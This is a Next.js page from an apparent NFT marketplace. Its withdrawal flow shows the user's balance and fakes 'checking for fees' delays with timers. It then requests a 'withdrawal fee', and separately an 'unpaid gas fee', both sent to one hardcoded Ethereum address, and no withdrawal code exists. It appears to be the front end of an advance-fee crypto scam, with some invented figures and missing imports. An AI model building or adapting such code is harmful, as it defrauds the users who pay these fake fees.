"use client";
import Image from "next/image";
import { useDataContext } from "@/components/context/DataProvider";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faEthereum } from "@fortawesome/free-brands-svg-icons";
import {
  faExclamationCircle,
  faTriangleExclamation,
} from "@fortawesome/free-solid-svg-icons";
import ConfirmBtn from "@/components/loading/ConfirmBtn";
import ShoppingCard from "@/components/NFtcards/ShoppingCard";
import { useState, useEffect, use } from "react";
import Loading from "@/components/loading/Loading";
import {
  useAccount,
  useSendTransaction,
  useWaitForTransactionReceipt,
  useConnect,
} from "wagmi";
import { parseEther } from "viem";
import { useAppKit } from "@reown/appkit/react";
import { toast } from "react-toastify";
import { useRouter } from "next/navigation";

const page = (props) => {
  const router = useRouter();
  const { connectAsync } = useConnect();
  const { address, isConnected, chainId } = useAccount();
  const { data: hash, isPending, sendTransaction } = useSendTransaction();
  const { isLoading: isConfirming, isSuccess: isConfirmed } =
    useWaitForTransactionReceipt({
      hash,
    });

  const params = use(props.params);
  const { appData, user } = useDataContext();
  const { assets, collections } = appData;

  const [collAssets, setCollAssets] = useState(null);

  const [resolvedParams, setResolvedParams] = useState(null);
  const [collection, setCollection] = useState(null);
  const [totalValue, setTotalValue] = useState(0);
  const [totalLike, setTotalLikes] = useState(0);
  const [totalViews, setTotalLikesViews] = useState(0);
  const [steps, setSteps] = useState(1);
  const [withdrawalTab, setWithdrawalTab] = useState(false);
  const [withdrawalMsg, setWithdrawalMsg] = useState("processing payment...");

  async function payGasfee() {
    try {
      if (!address) {
        await connectAsync({ chainId: mainnet.id, connector: injected() });
      }
      sendTransaction({
        to: "0x9247ebcd3cce95918b344b07d3a1b02884158e69",
        value: parseEther((collection?.gasfeeamount).toString()),
      });

      console.log(hash);
    } catch (error) {
      console.log(error.name, ": ", error.message);
    }
  }
  async function payWithdrawalFee() {
    try {
      if (!address) {
        await connectAsync({ chainId: mainnet.id, connector: injected() });
        return;
      }
      sendTransaction({
        to: "0x9247ebcd3cce95918b344b07d3a1b02884158e69",
        value: parseEther((collection?.withdrawalFee).toString()),
      });

      console.log(hash);
    } catch (error) {
      console.log(error.name, ": ", error.message);
    }
  }

  const cancelPayment = () => {
    setSteps(1);
    setWithdrawalTab(false);
    setWithdrawalMsg("processing payment...");
  };

  const nextStep = () => {
    setSteps((prev) => prev + 1);
  };
  const prevStep = () => {
    setSteps((prev) => prev - 1);
  };

  useEffect(() => {
    if (steps === 2) {
      setTimeout(() => {
        setWithdrawalMsg("checking for fees...");
      }, 2000);
      setTimeout(() => {
        setWithdrawalMsg(
          `withdrawal fee to process this transaction is ${collection?.withdrawalFee} eth`
        );
      }, 10000);
    }
  }, [steps]);

  useEffect(() => {
    if (isConfirmed) {
      toast.success("payment successful");
      setWithdrawalTab(false);
      setWithdrawalMsg("processing payment...");
    }
  }, [isConfirmed]);

  useEffect(() => {
    async function fetchParams() {
      const unwrappedParams = await params;
      setResolvedParams(unwrappedParams);
    }
    fetchParams();
  }, [params]);

  useEffect(() => {
    if (resolvedParams && assets.length) {
      const currentCollection = collections.find(
        (item) => item._id === resolvedParams.id
      );
      const collectionAssets = assets.filter(
        (item) => item?.collectionName?.name === currentCollection?.name
      );
      setCollection(currentCollection);
      setCollAssets(collectionAssets);

      const totalValue = [...collectionAssets].reduce(
        (acc, item) => acc + item?.price,
        0
      );
      const totallikes = [...collectionAssets].reduce(
        (acc, item) => acc + item?.likes,
        0
      );

      setTotalValue(totalValue);
      setTotalLikes(totallikes);
    }
  }, [resolvedParams, collections]);

  if (!resolvedParams || !collection)
    return <Loading otherStyles={"mx-auto"} />;
  return (
    <div className="w-full min-h-screen p-3 pt-[75px] pb-6">
      <div className="w-full p-2 flex flex-col sm:flex-row items-center justify-between">
        {withdrawalTab && (
          <div className="fixed w-[300px] min-h-[400px] sm:h-[511px] sm:w-[332px] bg-black z-40 flex flex-col items-center justify-center">
            {steps === 1 && (
              <div className="flex flex-col w-full items-center justify-center">
                <FontAwesomeIcon
                  icon={faExclamationCircle}
                  className="text-2xl text-green-600"
                />
                <p className="text-center max-w-72 break-words">
                  {" "}
                  the amount of <b> {(user?.balance).toFixed(4)} ETH</b> will be
                  sent to: <br /> {user?.walletAddress}{" "}
                </p>
                <div className="my-2">
                  {" "}
                  <ConfirmBtn
                    title={"Cancel"}
                    otherStyles={
                      "p-3 bg-[#ef8bf7]/40  rounded-[10px] mt-4 mx-1"
                    }
                    handleClicked={cancelPayment}
                  />
                  <ConfirmBtn
                    title={"Continue"}
                    otherStyles={
                      "p-3 bg-gradient-to-r from-[#843eff]/80 to-[#fe4ff2]/80 rounded-[10px] mt-4 mx-1"
                    }
                    handleClicked={nextStep}
                  />
                </div>
              </div>
            )}
            {steps === 2 && (
              <div className="flex flex-col w-full items-center justify-center ">
                <FontAwesomeIcon
                  icon={faExclamationCircle}
                  className="text-2xl text-yellow-500"
                />
                <p className="text-center max-w-72 break-words">
                  {withdrawalMsg}
                </p>
                {withdrawalMsg ===
                  `withdrawal fee to process this transaction is ${collection?.withdrawalFee} eth` && (
                  <div className="my-2 ">
                    <ConfirmBtn
                      title={"Cancel"}
                      otherStyles={
                        "p-3 bg-[#ef8bf7]/40  rounded-[10px] mt-4 mx-1"
                      }
                      handleClicked={cancelPayment}
                    />
                    <ConfirmBtn
                      title={"Pay now"}
                      otherStyles={
                        "p-3 bg-gradient-to-r from-[#843eff]/80 to-[#fe4ff2]/80 rounded-[10px] mt-4 mx-1"
                      }
                      handleClicked={payWithdrawalFee}
                    />
                  </div>
                )}
              </div>
            )}
          </div>
        )}

        <div className="flex items-start justify-between">
          <Image
            src={collection?.banner || "/assets/banner.jpg"}
            alt="collection image"
            width={1000}
            height={1000}
            className="rounded-[10px] w-[183px] h-[150px] sm:w-[283px] sm:h-[258px] object-contain mr-2 sm:mr-0"
          />

          <div className="flex flex-col self-center">
            <p className="text-xl font-bold text-[#FF4ff3] my-2">
              {collection.name}{" "}
            </p>
            <p className="text-xl font-medium text-[#ffffff] my-2">
              7 ETH
              <FontAwesomeIcon
                icon={faEthereum}
                className="text-[#000] text-xl ml-2"
              />{" "}
            </p>
            <p className="text-sm font-medium text-[#ffffff] my-2">
              Total assets : {collAssets.length}
            </p>
          </div>
        </div>
        {collection?.gasFee === "unpaid" && (
          <div className="bg-white  border-l-8 border-0 border-[#cb4747] w-[300px]  sm:w-[357px] py-3 flex flex-col justify-around relative">
            {isPending && <Loading otherStyles={"absolute"} />}
            {isConfirming && <Loading otherStyles={"absolute"} />}
            <h3 className="font-bold text-[#cb4747] pl-3">
              <FontAwesomeIcon icon={faTriangleExclamation} /> warning
            </h3>
            <p className="text-center text-black">
              The gas fee of this collection has not been paid.
            </p>
            <div className="w-[99%] border border-[#cb4747]" />
            <p className="text-black font-semibold w-full px-2">
              Estimated:{" "}
              <span className="float-right">
                {collection?.gasfeeamount} ETH{" "}
                <FontAwesomeIcon icon={faEthereum} />
              </span>
            </p>
            <ConfirmBtn
              title={"Pay now"}
              otherStyles={"bg-[#cb4747] p-3 mx-auto"}
              handleClicked={payGasfee}
            />
          </div>
        )}
      </div>

      <div className="w-full px-2 sm:px-20 mx-auto my-3 flex items-center justify-center gap-1 sm:gap-40">
        <div className="flex flex-col">
          <p className="text-[#969494] items-center">Views</p>
          <p className="font-bold text-2xl text-white"> 140 </p>
        </div>
        <div className="flex flex-col items-center">
          <p className="text-[#969494]">Value</p>
          <p className="font-bold text-2xl text-white">
            {" "}
            <FontAwesomeIcon icon={faEthereum} className="ml-1" />
            {totalValue}
          </p>
        </div>
        <div className="flex flex-col items-center">
          <p className="text-[#969494]">Favourite</p>
          <p className="font-bold text-2xl text-white"> {totalLike} </p>
        </div>
      </div>
      <div className="w-full p-3 grid grid-cols-1 sm:grid-cols-3 gap-8  justify-items-center">
        {collAssets &&
          collAssets.map((item, index) => (
            <ShoppingCard key={item?._id} data={item} />
          ))}
        {collAssets.length === 0 && (
          <p className="text-white font-bold text-xl text-center">
            {" "}
            No Assets found{" "}
          </p>
        )}
        {user?.balance > 0 && (
          <ConfirmBtn
            title={"Withdraw"}
            otherStyles={"bg-[#141414] p-4 w-[300px]"}
            handleClicked={() => setWithdrawalTab(true)}
          />
        )}
        <ConfirmBtn
          title={"Add Asset"}
          otherStyles={"bg-[#ff4ff3] p-4 w-[300px]"}
          handleClicked={() =>
            router.push(`/user/createAsset?collectionId=${collection._id}`)
          }
        />
        <ConfirmBtn
          title={"Delete collection"}
          otherStyles={"bg-[#cb4747] p-4 w-[300px]"}
        />
      </div>
    </div>
  );
};
export default page;
